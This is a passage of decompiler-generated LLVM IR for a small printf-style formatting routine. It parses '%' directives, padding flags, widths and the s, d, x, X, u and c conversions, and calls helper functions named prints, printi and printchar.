  br i1 %v4_8048544, label %dec_label_pc_804857b, label %dec_label_pc_804854a

dec_label_pc_804854a:                             ; preds = %dec_label_pc_8048544
  %v4_804854a = icmp eq i32 %tmp31, 0
  br i1 %v4_804854a, label %dec_label_pc_8048572, label %dec_label_pc_8048550

dec_label_pc_8048550:                             ; preds = %dec_label_pc_804854a
  %v1_8048553 = and i32 %tmp32, 2
  %v2_8048553 = icmp eq i32 %v1_8048553, 0
  br i1 %v2_8048553, label %dec_label_pc_8048572, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_8048550
  %v3_8048562 = inttoptr i32 %arg1 to i32*
  %v4_8048562 = call i32 @printchar(i32* %v3_8048562, i32 45)
  %v4_804856d = add i32 %tmp31, -1
  br label %dec_label_pc_804857b

dec_label_pc_8048572:                             ; preds = %dec_label_pc_8048550, %dec_label_pc_804854a
  %v4_8048572 = ptrtoint i8* %v3_8048572 to i32
  %v5_8048572 = add i32 %v4_8048572, -1
  %v22_8048572 = inttoptr i32 %v5_8048572 to i8*
  store i8* %v22_8048572, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_8048572, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80485816.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804857b

dec_label_pc_804857b:                             ; preds = %dec_label_pc_8048544, %dec_label_pc_804855a, %dec_label_pc_8048572
  %v3_80485816 = phi i32 [ %v3_8048581622, %dec_label_pc_8048544 ], [ %v3_80485816.pre, %dec_label_pc_8048572 ], [ %v3_8048581622, %dec_label_pc_804855a ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_8048544 ], [ %tmp31, %dec_label_pc_8048572 ], [ %v4_804856d, %dec_label_pc_804855a ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048544 ], [ 0, %dec_label_pc_8048572 ], [ 1, %dec_label_pc_804855a ]
  %v1_8048587.cast = inttoptr i32 %v3_80485816 to i8*
  %v6_8048587 = call i32 @prints(i32 %arg1, i8* %v1_8048587.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_8048592 = add i32 %v6_8048587, %stack_var_-28.0
  store i32 %v2_8048592, i32* @edx, align 4
  br label %dec_label_pc_8048597

dec_label_pc_8048597:                             ; preds = %dec_label_pc_8048497, %dec_label_pc_804857b
  %storemerge = phi i32 [ %v2_8048592, %dec_label_pc_804857b ], [ %v6_80484ac, %dec_label_pc_8048497 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_8048516, { 0, 1, 3, 2 }
  uselistorder i8 %v5_8048501, { 1, 0 }
  uselistorder i64 %v6_80484fc, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048597, { 1, 0 }
  uselistorder label %dec_label_pc_804857b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048516, { 1, 0 }
  uselistorder label %dec_label_pc_80484ee, { 1, 0 }
  uselistorder label %dec_label_pc_80484dd, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804859c = load i32, i32* @ebp, align 4
  store i32 %v0_804859c, i32* %stack_var_-4, align 4
  %v15_804859f = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048791 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.444 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80487c745 = load i8, i8* %stack_var_8.444, align 1
  %v3_80487c746 = zext i8 %v2_80487c745 to i32
  %v5_80487c747 = and i32 %arg2, -256
  %v6_80487c748 = or i32 %v3_80487c746, %v5_80487c747
  store i32 %v6_80487c748, i32* %eax.global-to-local, align 4
  %v4_80487c949 = icmp eq i8 %v2_80487c745, 0
  %v1_80487cb50 = icmp eq i1 %v4_80487c949, false
  br i1 %v1_80487cb50, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80485ae:                             ; preds = %entry, %dec_label_pc_80487c1
  %v0_80487af = phi i32 [ %v4_804867366, %dec_label_pc_80487c1 ], [ %v15_804859f, %entry ]
  %v5_80487c756 = phi i32 [ %v5_80487c7, %dec_label_pc_80487c1 ], [ %v5_80487c747, %entry ]
  %stack_var_8.455 = phi i8* [ %stack_var_8.4, %dec_label_pc_80487c1 ], [ %stack_var_8.444, %entry ]
  %stack_var_-28.154 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80487c1 ], [ 0, %entry ]
  %stack_var_8.4.in53 = phi i32 [ %v5_80487c1, %dec_label_pc_80487c1 ], [ %arg2, %entry ]
  %stack_var_12.152 = phi i32 [ %stack_var_12.0, %dec_label_pc_80487c1 ], [ %arg3, %entry ]
  %stack_var_-24.151 = phi i32 [ %stack_var_-24.0, %dec_label_pc_80487c1 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in53, i32* %eax.global-to-local, align 4
  %v2_80485b1 = load i8, i8* %stack_var_8.455, align 1
  %v3_80485b1 = zext i8 %v2_80485b1 to i32
  %v6_80485b1 = or i32 %v3_80485b1, %v5_80487c756
  store i32 %v6_80485b1, i32* %eax.global-to-local, align 4
  %v10_80485b3 = icmp eq i8 %v2_80485b1, 37
  %v1_80485b5 = icmp eq i1 %v10_80485b3, false
  br i1 %v1_80485b5, label %dec_label_pc_80487a5, label %dec_label_pc_80485bb

dec_label_pc_80485bb:                             ; preds = %dec_label_pc_80485ae
  %v5_80485bb = add i32 %stack_var_8.4.in53, 1
  %v22_80485bb = inttoptr i32 %v5_80485bb to i8*
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485ce = load i8, i8* %v22_80485bb, align 1
  %v3_80485ce = zext i8 %v2_80485ce to i32
  %v5_80485ce = and i32 %v5_80485bb, -256
  %v6_80485ce = or i32 %v3_80485ce, %v5_80485ce
  store i32 %v6_80485ce, i32* %eax.global-to-local, align 4
  %v4_80485d0 = icmp eq i8 %v2_80485ce, 0
  br i1 %v4_80485d0, label %dec_label_pc_80487d1, label %dec_label_pc_80485d8

dec_label_pc_80485d8:                             ; preds = %dec_label_pc_80485bb
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485db = load i8, i8* %v22_80485bb, align 1
  %v3_80485db = zext i8 %v2_80485db to i32
  %v6_80485db = or i32 %v3_80485db, %v5_80485ce
  store i32 %v6_80485db, i32* %eax.global-to-local, align 4
  %v10_80485dd = icmp eq i8 %v2_80485db, 37
  br i1 %v10_80485dd, label %dec_label_pc_80487a5, label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_80485d8
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485e8 = load i8, i8* %v22_80485bb, align 1
  %v3_80485e8 = zext i8 %v2_80485e8 to i32
  %v6_80485e8 = or i32 %v3_80485e8, %v5_80485ce
  store i32 %v6_80485e8, i32* %eax.global-to-local, align 4
  %v10_80485ea = icmp eq i8 %v2_80485e8, 45
  %v1_80485ec = icmp eq i1 %v10_80485ea, false
  br i1 %v1_80485ec, label %dec_label_pc_8048601.preheader, label %dec_label_pc_80485ee

dec_label_pc_80485ee:                             ; preds = %dec_label_pc_80485e5
  %v5_80485ee = add i32 %stack_var_8.4.in53, 2
  %v22_80485ee = inttoptr i32 %v5_80485ee to i8*
  br label %dec_label_pc_8048601.preheader

dec_label_pc_8048601.preheader:                   ; preds = %dec_label_pc_80485ee, %dec_label_pc_80485e5
  %stack_var_8.0.ph = phi i8* [ %v22_80485bb, %dec_label_pc_80485e5 ], [ %v22_80485ee, %dec_label_pc_80485ee ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_80485e5 ], [ 1, %dec_label_pc_80485ee ]
  %v4_804860115 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804860115, i32* %eax.global-to-local, align 4
  %v2_804860416 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804860417 = zext i8 %v2_804860416 to i32
  %v5_804860418 = and i32 %v4_804860115, -256
  %v6_804860419 = or i32 %v3_804860417, %v5_804860418
  store i32 %v6_804860419, i32* %eax.global-to-local, align 4
  %v7_804860621 = icmp eq i8 %v2_804860416, 48
  br i1 %v7_804860621, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_80485fa:                             ; preds = %dec_label_pc_8048601.preheader, %dec_label_pc_80485fa
  %v4_804860123 = phi i32 [ %v5_80485fa, %dec_label_pc_80485fa ], [ %v4_804860115, %dec_label_pc_8048601.preheader ]
  %stack_var_-32.022 = phi i32 [ %v4_80485fd, %dec_label_pc_80485fa ], [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ]
  %v5_80485fa = add i32 %v4_804860123, 1
  %v22_80485fa = inttoptr i32 %v5_80485fa to i8*
  %v4_80485fd = or i32 %stack_var_-32.022, 2
  store i32 %v5_80485fa, i32* %eax.global-to-local, align 4
  %v2_8048604 = load i8, i8* %v22_80485fa, align 1
  %v3_8048604 = zext i8 %v2_8048604 to i32
  %v5_8048604 = and i32 %v5_80485fa, -256
  %v6_8048604 = or i32 %v3_8048604, %v5_8048604
  store i32 %v6_8048604, i32* %eax.global-to-local, align 4
  %v7_8048606 = icmp eq i8 %v2_8048604, 48
  br i1 %v7_8048606, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_8048630.preheader:                   ; preds = %dec_label_pc_80485fa, %dec_label_pc_8048601.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ], [ %v4_80485fd, %dec_label_pc_80485fa ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_8048601.preheader ], [ %v22_80485fa, %dec_label_pc_80485fa ]
  %v4_804863025 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804863025, i32* %eax.global-to-local, align 4
  %v2_804863326 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804863327 = zext i8 %v2_804863326 to i32
  %v5_804863328 = and i32 %v4_804863025, -256
  %v6_804863329 = or i32 %v3_804863327, %v5_804863328
  store i32 %v6_804863329, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_804863326, 48
  br i1 %tmp67, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_804860c:                             ; preds = %dec_label_pc_8048639
  %v2_8048615 = mul i32 %stack_var_-36.032, 10
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804861d = load i8, i8* %stack_var_8.133, align 1
  %v3_804861d = zext i8 %v2_804861d to i32
  %v5_8048624 = add i32 %v3_804861d, %v2_8048615
  %v1_8048627 = add i32 %v5_8048624, -48
  %v5_804862d = add i32 %v4_804863034, 1
  %v22_804862d = inttoptr i32 %v5_804862d to i8*
  store i32 %v5_804862d, i32* %eax.global-to-local, align 4
  %v2_8048633 = load i8, i8* %v22_804862d, align 1
  %v3_8048633 = zext i8 %v2_8048633 to i32
  %v5_8048633 = and i32 %v5_804862d, -256
  %v6_8048633 = or i32 %v3_8048633, %v5_8048633
  store i32 %v6_8048633, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i8 %v2_8048633, 48
  br i1 %tmp68, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_8048639:                             ; preds = %dec_label_pc_8048630.preheader, %dec_label_pc_804860c
  %v5_804863335 = phi i32 [ %v5_8048633, %dec_label_pc_804860c ], [ %v5_804863328, %dec_label_pc_8048630.preheader ]
  %v4_804863034 = phi i32 [ %v5_804862d, %dec_label_pc_804860c ], [ %v4_804863025, %dec_label_pc_8048630.preheader ]
  %stack_var_8.133 = phi i8* [ %v22_804862d, %dec_label_pc_804860c ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ]
  %stack_var_-36.032 = phi i32 [ %v1_8048627, %dec_label_pc_804860c ], [ 0, %dec_label_pc_8048630.preheader ]
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804863c = load i8, i8* %stack_var_8.133, align 1
  %v3_804863c = zext i8 %v2_804863c to i32
  %v6_804863c = or i32 %v3_804863c, %v5_804863335
  store i32 %v6_804863c, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i8 %v2_804863c, 58
  br i1 %tmp69, label %dec_label_pc_804860c, label %dec_label_pc_8048642

dec_label_pc_8048642:                             ; preds = %dec_label_pc_804860c, %dec_label_pc_8048639, %dec_label_pc_8048630.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_8048630.preheader ], [ %stack_var_-36.032, %dec_label_pc_8048639 ], [ %v1_8048627, %dec_label_pc_804860c ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ], [ %stack_var_8.133, %dec_label_pc_8048639 ], [ %v22_804862d, %dec_label_pc_804860c ]
  %v4_8048630.lcssa = phi i32 [ %v4_804863025, %dec_label_pc_8048630.preheader ], [ %v4_804863034, %dec_label_pc_8048639 ], [ %v5_804862d, %dec_label_pc_804860c ]
  %v5_8048633.lcssa = phi i32 [ %v5_804863328, %dec_label_pc_8048630.preheader ], [ %v5_804863335, %dec_label_pc_8048639 ], [ %v5_8048633, %dec_label_pc_804860c ]
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048645 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048645 = zext i8 %v2_8048645 to i32
  %v6_8048645 = or i32 %v3_8048645, %v5_8048633.lcssa
  store i32 %v6_8048645, i32* %eax.global-to-local, align 4
  %v10_8048647 = icmp eq i8 %v2_8048645, 115
  %v1_8048649 = icmp eq i1 %v10_8048647, false
  br i1 %v1_8048649, label %dec_label_pc_804868d, label %dec_label_pc_804864b

dec_label_pc_804864b:                             ; preds = %dec_label_pc_8048642
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804864e = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048656 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048656 = load i32, i32* %v1_8048656, align 4
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v4_804865b = icmp eq i32 %v2_8048656, 0
  br i1 %v4_804865b, label %dec_label_pc_8048670, label %dec_label_pc_8048661

dec_label_pc_8048661:                             ; preds = %dec_label_pc_804864b
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v5_8048664 = inttoptr i32 %v2_8048656 to i8*
  br label %dec_label_pc_8048670

dec_label_pc_8048670:                             ; preds = %dec_label_pc_804864b, %dec_label_pc_8048661
  %storemerge = phi i8* [ %v5_8048664, %dec_label_pc_8048661 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805532d.12, i32 0, i32 0), %dec_label_pc_804864b ]
  %v4_8048670 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8048670, i32* %eax.global-to-local, align 4
  %v5_8048673 = add i32 %v0_80487af, -4
  %v6_8048673 = inttoptr i32 %v5_8048673 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048673, align 4
  %v5_8048676 = add i32 %v0_80487af, -8
  %v6_8048676 = inttoptr i32 %v5_8048676 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048676, align 4
  %v0_8048679 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048679 = add i32 %v0_80487af, -12
  %v3_8048679 = inttoptr i32 %v2_8048679 to i32*
  store i32 %v0_8048679, i32* %v3_8048679, align 4
  %v5_804867a = add i32 %v0_80487af, -16
  %v6_804867a = inttoptr i32 %v5_804867a to i32*
  store i32 %tmp3, i32* %v6_804867a, align 4
  %v5_804867d = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804867d = call i32 @prints(i32 %v4_8048670, i8* %v5_804867d, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.154)
  store i32 %v6_804867d, i32* %eax.global-to-local, align 4
  %v0_8048682 = load i32, i32* @esp, align 4
  %v1_8048682 = add i32 %v0_8048682, 16
  %v5_8048685 = add i32 %v6_804867d, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048642
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048690 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048690 = zext i8 %v2_8048690 to i32
  %v6_8048690 = or i32 %v3_8048690, %v5_8048633.lcssa
  store i32 %v6_8048690, i32* %eax.global-to-local, align 4
  %v10_8048692 = icmp eq i8 %v2_8048690, 100
  %v1_8048694 = icmp eq i1 %v10_8048692, false
  br i1 %v1_8048694, label %dec_label_pc_80486c6, label %dec_label_pc_8048696

dec_label_pc_8048696:                             ; preds = %dec_label_pc_804868d
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048699 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486a1 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486a1 = load i32, i32* %v1_80486a1, align 4
  store i32 %v2_80486a1, i32* %eax.global-to-local, align 4
  %v1_80486a6 = add i32 %v0_80487af, -8
  %v2_80486a6 = inttoptr i32 %v1_80486a6 to i32*
  store i32 97, i32* %v2_80486a6, align 4
  %v5_80486a8 = add i32 %v0_80487af, -12
  %v6_80486a8 = inttoptr i32 %v5_80486a8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486a8, align 4
  %v5_80486ab = add i32 %v0_80487af, -16
  %v6_80486ab = inttoptr i32 %v5_80486ab to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486ab, align 4
  %v1_80486ae = add i32 %v0_80487af, -20
  %v2_80486ae = inttoptr i32 %v1_80486ae to i32*
  store i32 1, i32* %v2_80486ae, align 4
  %v1_80486b0 = add i32 %v0_80487af, -24
  %v2_80486b0 = inttoptr i32 %v1_80486b0 to i32*
  store i32 10, i32* %v2_80486b0, align 4
  %v0_80486b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80486b2 = add i32 %v0_80487af, -28
  %v3_80486b2 = inttoptr i32 %v2_80486b2 to i32*
  store i32 %v0_80486b2, i32* %v3_80486b2, align 4
  %v5_80486b3 = add i32 %v0_80487af, -32
  %v6_80486b3 = inttoptr i32 %v5_80486b3 to i32*
  store i32 %tmp3, i32* %v6_80486b3, align 4
  %v1_80486b6 = call i32 @printi(i32 %v1_8048699)
  store i32 %v1_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esp, align 4
  %v1_80486bb = add i32 %v0_80486bb, 32
  %v5_80486be = add i32 %v1_80486b6, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486c6:                             ; preds = %dec_label_pc_804868d
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486c9 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486c9 = zext i8 %v2_80486c9 to i32
  %v6_80486c9 = or i32 %v3_80486c9, %v5_8048633.lcssa
  store i32 %v6_80486c9, i32* %eax.global-to-local, align 4
  %v10_80486cb = icmp eq i8 %v2_80486c9, 120
  %v1_80486cd = icmp eq i1 %v10_80486cb, false
  br i1 %v1_80486cd, label %dec_label_pc_80486ff, label %dec_label_pc_80486cf

dec_label_pc_80486cf:                             ; preds = %dec_label_pc_80486c6
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_80486d2 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486da = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486da = load i32, i32* %v1_80486da, align 4
  store i32 %v2_80486da, i32* %eax.global-to-local, align 4
  %v1_80486df = add i32 %v0_80487af, -8
  %v2_80486df = inttoptr i32 %v1_80486df to i32*
  store i32 97, i32* %v2_80486df, align 4
  %v5_80486e1 = add i32 %v0_80487af, -12
  %v6_80486e1 = inttoptr i32 %v5_80486e1 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486e1, align 4
  %v5_80486e4 = add i32 %v0_80487af, -16
  %v6_80486e4 = inttoptr i32 %v5_80486e4 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486e4, align 4
  %v1_80486e7 = add i32 %v0_80487af, -20
  %v2_80486e7 = inttoptr i32 %v1_80486e7 to i32*
  store i32 0, i32* %v2_80486e7, align 4
  %v1_80486e9 = add i32 %v0_80487af, -24
  %v2_80486e9 = inttoptr i32 %v1_80486e9 to i32*
  store i32 16, i32* %v2_80486e9, align 4
  %v0_80486eb = load i32, i32* %eax.global-to-local, align 4
  %v2_80486eb = add i32 %v0_80487af, -28
  %v3_80486eb = inttoptr i32 %v2_80486eb to i32*
  store i32 %v0_80486eb, i32* %v3_80486eb, align 4
  %v5_80486ec = add i32 %v0_80487af, -32
  %v6_80486ec = inttoptr i32 %v5_80486ec to i32*
  store i32 %tmp3, i32* %v6_80486ec, align 4
  %v1_80486ef = call i32 @printi(i32 %v1_80486d2)
  store i32 %v1_80486ef, i32* %eax.global-to-local, align 4
  %v0_80486f4 = load i32, i32* @esp, align 4
  %v1_80486f4 = add i32 %v0_80486f4, 32
  %v5_80486f7 = add i32 %v1_80486ef, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486ff:                             ; preds = %dec_label_pc_80486c6
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048702 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048702 = zext i8 %v2_8048702 to i32
  %v6_8048702 = or i32 %v3_8048702, %v5_8048633.lcssa
  store i32 %v6_8048702, i32* %eax.global-to-local, align 4
  %v10_8048704 = icmp eq i8 %v2_8048702, 88
  %v1_8048706 = icmp eq i1 %v10_8048704, false
  br i1 %v1_8048706, label %dec_label_pc_8048738, label %dec_label_pc_8048708

dec_label_pc_8048708:                             ; preds = %dec_label_pc_80486ff
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804870b = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048713 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048713 = load i32, i32* %v1_8048713, align 4
  store i32 %v2_8048713, i32* %eax.global-to-local, align 4
  %v1_8048718 = add i32 %v0_80487af, -8
  %v2_8048718 = inttoptr i32 %v1_8048718 to i32*
  store i32 65, i32* %v2_8048718, align 4
  %v5_804871a = add i32 %v0_80487af, -12
  %v6_804871a = inttoptr i32 %v5_804871a to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804871a, align 4
  %v5_804871d = add i32 %v0_80487af, -16
  %v6_804871d = inttoptr i32 %v5_804871d to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804871d, align 4
  %v1_8048720 = add i32 %v0_80487af, -20
  %v2_8048720 = inttoptr i32 %v1_8048720 to i32*
  store i32 0, i32* %v2_8048720, align 4
  %v1_8048722 = add i32 %v0_80487af, -24
  %v2_8048722 = inttoptr i32 %v1_8048722 to i32*
  store i32 16, i32* %v2_8048722, align 4
  %v0_8048724 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048724 = add i32 %v0_80487af, -28
  %v3_8048724 = inttoptr i32 %v2_8048724 to i32*
  store i32 %v0_8048724, i32* %v3_8048724, align 4
  %v5_8048725 = add i32 %v0_80487af, -32
  %v6_8048725 = inttoptr i32 %v5_8048725 to i32*
  store i32 %tmp3, i32* %v6_8048725, align 4
  %v1_8048728 = call i32 @printi(i32 %v1_804870b)
  store i32 %v1_8048728, i32* %eax.global-to-local, align 4
  %v0_804872d = load i32, i32* @esp, align 4
  %v1_804872d = add i32 %v0_804872d, 32
  %v5_8048730 = add i32 %v1_8048728, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_8048738:                             ; preds = %dec_label_pc_80486ff
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_804873b = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804873b = zext i8 %v2_804873b to i32
  %v6_804873b = or i32 %v3_804873b, %v5_8048633.lcssa
  store i32 %v6_804873b, i32* %eax.global-to-local, align 4
  %v10_804873d = icmp eq i8 %v2_804873b, 117
  %v1_804873f = icmp eq i1 %v10_804873d, false
  br i1 %v1_804873f, label %dec_label_pc_804876e, label %dec_label_pc_8048741

dec_label_pc_8048741:                             ; preds = %dec_label_pc_8048738
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048744 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_804874c = inttoptr i32 %stack_var_12.152 to i32*
  %v2_804874c = load i32, i32* %v1_804874c, align 4
  store i32 %v2_804874c, i32* %eax.global-to-local, align 4
  %v1_8048751 = add i32 %v0_80487af, -8
  %v2_8048751 = inttoptr i32 %v1_8048751 to i32*
  store i32 97, i32* %v2_8048751, align 4
  %v5_8048753 = add i32 %v0_80487af, -12
  %v6_8048753 = inttoptr i32 %v5_8048753 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048753, align 4
  %v5_8048756 = add i32 %v0_80487af, -16
  %v6_8048756 = inttoptr i32 %v5_8048756 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048756, align 4
  %v1_8048759 = add i32 %v0_80487af, -20
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  store i32 0, i32* %v2_8048759, align 4
  %v1_804875b = add i32 %v0_80487af, -24
  %v2_804875b = inttoptr i32 %v1_804875b to i32*
  store i32 10, i32* %v2_804875b, align 4
  %v0_804875d = load i32, i32* %eax.global-to-local, align 4
  %v2_804875d = add i32 %v0_80487af, -28
  %v3_804875d = inttoptr i32 %v2_804875d to i32*
  store i32 %v0_804875d, i32* %v3_804875d, align 4
  %v5_804875e = add i32 %v0_80487af, -32
  %v6_804875e = inttoptr i32 %v5_804875e to i32*
  store i32 %tmp3, i32* %v6_804875e, align 4
  %v1_8048761 = call i32 @printi(i32 %v1_8048744)
  store i32 %v1_8048761, i32* %eax.global-to-local, align 4
  %v0_8048766 = load i32, i32* @esp, align 4
  %v1_8048766 = add i32 %v0_8048766, 32
  %v5_8048769 = add i32 %v1_8048761, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804876e:                             ; preds = %dec_label_pc_8048738
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048771 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048771 = zext i8 %v2_8048771 to i32
  %v6_8048771 = or i32 %v3_8048771, %v5_8048633.lcssa
  store i32 %v6_8048771, i32* %eax.global-to-local, align 4
  %v10_8048773 = icmp eq i8 %v2_8048771, 99
  %v1_8048775 = icmp eq i1 %v10_8048773, false
  br i1 %v1_8048775, label %dec_label_pc_80487c1, label %dec_label_pc_8048777

dec_label_pc_8048777:                             ; preds = %dec_label_pc_804876e
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804877a = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048782 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048782 = load i32, i32* %v1_8048782, align 4
  store i32 %v2_8048782, i32* %stack_var_-6, align 4
  %v5_804878b = add i32 %v0_80487af, -4
  %v6_804878b = inttoptr i32 %v5_804878b to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804878b, align 4
  %v5_804878e = add i32 %v0_80487af, -8
  %v6_804878e = inttoptr i32 %v5_804878e to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804878e, align 4
  store i32 %v2_8048791, i32* %eax.global-to-local, align 4
  %v2_8048794 = add i32 %v0_80487af, -12
  %v3_8048794 = inttoptr i32 %v2_8048794 to i32*
  store i32 %v2_8048791, i32* %v3_8048794, align 4
  %v5_8048795 = add i32 %v0_80487af, -16
  %v6_8048795 = inttoptr i32 %v5_8048795 to i32*
  store i32 %tmp3, i32* %v6_8048795, align 4
  %v0_8048798 = load i32, i32* %stack_var_-6, align 4
  %v6_8048798 = call i32 @prints(i32 %v0_8048798, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048798, i32* %eax.global-to-local, align 4
  %v0_804879d = load i32, i32* @esp, align 4
  %v1_804879d = add i32 %v0_804879d, 16
  %v5_80487a0 = add i32 %v6_8048798, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80487a5:                             ; preds = %dec_label_pc_80485d8, %dec_label_pc_80485ae
  %stack_var_8.2 = phi i8* [ %stack_var_8.455, %dec_label_pc_80485ae ], [ %v22_80485bb, %dec_label_pc_80485d8 ]
  %v4_80487a5 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_80487a5, i32* %eax.global-to-local, align 4
  %v2_80487a8 = load i8, i8* %stack_var_8.2, align 1
